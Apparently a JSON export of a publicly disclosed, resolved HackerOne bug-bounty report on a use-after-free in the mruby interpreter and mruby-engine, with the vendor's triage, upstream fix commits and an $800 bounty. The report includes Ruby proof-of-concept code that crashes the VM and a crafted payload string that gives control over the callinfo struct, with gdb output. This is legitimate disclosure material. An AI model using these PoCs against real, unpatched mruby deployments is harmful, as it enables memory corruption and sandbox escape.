@@ -1,0 +1,323 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-04-02T13:29:48.040Z", 
+    "voters": [
+        "delimitry", 
+        "dgaletic", 
+        "r4s_team", 
+        "eveeez", 
+        "cyberunit", 
+        "linkks", 
+        "spetr0x"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "800.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 213261, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-03-28T21:18:46.132Z", 
+    "vulnerability_information": "PoC\n===\n\nThe following code demonstrates a crash:\n\n    class A < def to_str\n      \"\"[1, 2, 3]\n      ensure --> {} rescue\n      Struct.new.new.to_h\n      end\n    end\n\nDiscussion\n==========\n    \nmruby crashes due to an invalid pointer dereference in vm.c:1692:\n\n    1689\u2502       L_RESCUE:\n    1690\u2502         if (ci->ridx == 0) goto L_STOP;\n    1691\u2502         proc = ci->proc;\n    1692\u251c>        irep = proc->body.irep;\n\n(gdb) print ci->proc\n$3 = (struct RProc *) 0x511\n\nmruby-engine crashes similarly in class.h:50:\n\n    50\u251c>    return mrb_obj_ptr(v)->c;\n    51\u2502   }\n    52\u2502 }\n\n(gdb) print mrb_obj_ptr(v)\n$2 = (struct RObject *) 0x6\n\nValgrind reports many (3032 errors from 108 contexts) invalid reads and writes happening inside memory free'd by a realloc. We were able to exploit this to achieve control over the callinfo struct in mruby, as demonstrated here on `proc`:\n\n    class A < def to_str\n    a = \"AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEp\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fsAEtAEuAEvAEwAExX\\xe5\\xfc\\xff\\xff\\x6f\\x00\\x001AE2AE3AE4AE5AE6AE7AE8AE\\x90\\xe0n\\x00\\x00\\x00\\x00\\x00FCAFDAFEAFFA\\x00\\x00\\x00\\x00HAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFk\" * 4\n      \"\"[1, 2, 3]\n      ensure --> {} rescue\n      Struct.new.new.to_h\n      end\n    end\n    \nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000041f164 in mrb_vm_exec (mrb=0x6af010, proc=0xf0f0f0f0f0f0f0f, pc=0x71dd18) at /home/<user>/repos/mruby/src/vm.c:1692\n(gdb) print *ci\n$3 = {mid = 1161915973, proc = 0xf0f0f0f0f0f0f0f, stackent = 0x4175454174454173, nregs = 1161918021, ridx = 2017804663, eidx = -203432, env = 0x4133454132454131, pc =0x3645413545413445, err = 0x4541384541374541, argc = 7266448, acc = 0, target_class = 0x4546414446414346}\n\nWe will continue working on this bug to see whether the same can be achieved in mruby-engine.\n\nThank you,\nDinko Galetic\nDenis Kasak", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "User"
+    }, 
+    "title": "Use-after-free leading to an invalid pointer dereference", 
+    "is_member_of_team?": null, 
+    "vote_count": 7, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-04-27T21:18:46.168Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$800", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": true, 
+            "created_at": "2017-03-14T00:21:30.548Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T00:21:30.548Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!", 
+            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1539129, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T00:49:36.123Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T00:49:36.123Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "These results were achieved consistently on Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu 1~14.04.3). On Arch Linux (updated 2017-03-13), the PoC code did not crash on every run. In both cases, the following were built:\n\nmruby SHA: 191ee2596cc7b22e3213d82bab1a48ae6152b475\nmruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f\n\nThe gdb output shown for mruby-engine uses a mruby submodule commit (4ab70294ea01cbaf6bdbfbea5bbd854f6661cfd8) several commits behind the one we used to test mruby on its own. The crash is present in 191ee2596cc7b22e3213d82bab1a48ae6152b475 as well, though this time in vm.c:1806 (mrb_vm_exec):\n\n    1804\u2502         regs[acc] = v;\n    1805\u2502       }\n    1806\u251c>      JUMP;\n    1807\u2502     }\n\n(gdb) print *pc\nCannot access memory at address 0x0", 
+            "markdown_message": "<p>These results were achieved consistently on Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu 1~14.04.3). On Arch Linux (updated 2017-03-13), the PoC code did not crash on every run. In both cases, the following were built:</p>\n\n<p>mruby SHA: 191ee2596cc7b22e3213d82bab1a48ae6152b475<br>\nmruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f</p>\n\n<p>The gdb output shown for mruby-engine uses a mruby submodule commit (4ab70294ea01cbaf6bdbfbea5bbd854f6661cfd8) several commits behind the one we used to test mruby on its own. The crash is present in 191ee2596cc7b22e3213d82bab1a48ae6152b475 as well, though this time in vm.c:1806 (mrb_vm_exec):</p>\n<pre class=\"highlight plaintext\"><code>1804\u2502         regs[acc] = v;\n1805\u2502       }\n1806\u251c&gt;      JUMP;\n1807\u2502     }\n</code></pre>\n<p>(gdb) print *pc<br>\nCannot access memory at address 0x0</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1539159, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-15T15:05:50.230Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-15T15:05:50.230Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We've reproduced the issue and opened an issue upstream: https://github.com/mruby/mruby/issues/3515", 
+            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the issue and opened an issue upstream: <a title=\"https://github.com/mruby/mruby/issues/3515\" href=\"/redirect?signature=1a075d060d9e4781ece65d7f6571b9c0774d6494&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3515\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3515</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1543069, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "dgaletic", 
+                "url": "/dgaletic"
+            }, 
+            "created_at": "2017-03-20T19:35:23.717Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-20T19:35:23.717Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks again for your report. This issue was addressed in the following upstream commits:\n\nhttps://github.com/mruby/mruby/commit/ef105b5ca41018f30c38f9738d5b54c4aa0fe6e4\nhttps://github.com/mruby/mruby/commit/527dcd52478567c30547d10c87c867cc01865a82\nhttps://github.com/mruby/mruby/commit/09574922a987aaa0813a4dfd37ac89ca60ca4281\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.", 
+            "markdown_message": "<p>Thanks again for your report. This issue was addressed in the following upstream commits:</p>\n\n<p><a title=\"https://github.com/mruby/mruby/commit/ef105b5ca41018f30c38f9738d5b54c4aa0fe6e4\" href=\"/redirect?signature=f308cc2981375bdab52f7832965406e2955ab3a4&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fef105b5ca41018f30c38f9738d5b54c4aa0fe6e4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/ef105b5ca41018f30c38f9738d5b54c4aa0fe6e4</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/mruby/mruby/commit/527dcd52478567c30547d10c87c867cc01865a82\" href=\"/redirect?signature=e0367916246c62851201b6aeda34e05d8301b238&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F527dcd52478567c30547d10c87c867cc01865a82\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/527dcd52478567c30547d10c87c867cc01865a82</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/mruby/mruby/commit/09574922a987aaa0813a4dfd37ac89ca60ca4281\" href=\"/redirect?signature=5773ad9298068ee6c2ebb474f1f04500ecb000c1&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F09574922a987aaa0813a4dfd37ac89ca60ca4281\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/09574922a987aaa0813a4dfd37ac89ca60ca4281</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1553044, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-03-28T21:18:39.307Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-28T21:18:39.307Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "800.0", 
+            "collaborator": {
+                "username": "dgaletic", 
+                "url": "/dgaletic"
+            }, 
+            "message": "Thanks for helping improve the security of Shopify!", 
+            "markdown_message": "<p>Thanks for helping improve the security of Shopify!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1568996, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-28T21:18:46.147Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-28T21:18:46.147Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1568997, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-02T13:29:48.066Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-02T13:29:48.066Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1578440, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-02T13:29:48.122Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-02T13:29:48.122Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1578441, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "dgaletic", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/dgaletic", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 48, 
+        "name": "Denial of Service"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -50808141.48150524, 
+    "disclosed_at": "2017-04-02T13:29:48.105Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/213261", 
+    "created_at": "2017-03-14T00:21:30.366Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"poc\">PoC</h1>\n\n<p>The following code demonstrates a crash:</p>\n<pre class=\"highlight plaintext\"><code>class A &lt; def to_str\n  &quot;&quot;[1, 2, 3]\n  ensure --&gt; {} rescue\n  Struct.new.new.to_h\n  end\nend\n</code></pre>\n<h1 id=\"discussion\">Discussion</h1>\n\n<p>mruby crashes due to an invalid pointer dereference in vm.c:1692:</p>\n<pre class=\"highlight plaintext\"><code>1689\u2502       L_RESCUE:\n1690\u2502         if (ci-&gt;ridx == 0) goto L_STOP;\n1691\u2502         proc = ci-&gt;proc;\n1692\u251c&gt;        irep = proc-&gt;body.irep;\n</code></pre>\n<p>(gdb) print ci-&gt;proc<br>\n$3 = (struct RProc *) 0x511</p>\n\n<p>mruby-engine crashes similarly in class.h:50:</p>\n<pre class=\"highlight plaintext\"><code>50\u251c&gt;    return mrb_obj_ptr(v)-&gt;c;\n51\u2502   }\n52\u2502 }\n</code></pre>\n<p>(gdb) print mrb_obj_ptr(v)<br>\n$2 = (struct RObject *) 0x6</p>\n\n<p>Valgrind reports many (3032 errors from 108 contexts) invalid reads and writes happening inside memory free&#39;d by a realloc. We were able to exploit this to achieve control over the callinfo struct in mruby, as demonstrated here on <code>proc</code>:</p>\n<pre class=\"highlight plaintext\"><code>class A &lt; def to_str\na = &quot;AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEp\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fsAEtAEuAEvAEwAExX\\xe5\\xfc\\xff\\xff\\x6f\\x00\\x001AE2AE3AE4AE5AE6AE7AE8AE\\x90\\xe0n\\x00\\x00\\x00\\x00\\x00FCAFDAFEAFFA\\x00\\x00\\x00\\x00HAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFk&quot; * 4\n  &quot;&quot;[1, 2, 3]\n  ensure --&gt; {} rescue\n  Struct.new.new.to_h\n  end\nend\n</code></pre>\n<p>Program received signal SIGSEGV, Segmentation fault.<br>\n0x000000000041f164 in mrb_vm_exec (mrb=0x6af010, proc=0xf0f0f0f0f0f0f0f, pc=0x71dd18) at /home/&lt;user&gt;/repos/mruby/src/vm.c:1692<br>\n(gdb) print *ci<br>\n$3 = {mid = 1161915973, proc = 0xf0f0f0f0f0f0f0f, stackent = 0x4175454174454173, nregs = 1161918021, ridx = 2017804663, eidx = -203432, env = 0x4133454132454131, pc =0x3645413545413445, err = 0x4541384541374541, argc = 7266448, acc = 0, target_class = 0x4546414446414346}</p>\n\n<p>We will continue working on this bug to see whether the same can be achieved in mruby-engine.</p>\n\n<p>Thank you,<br>\nDinko Galetic<br>\nDenis Kasak</p>\n", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
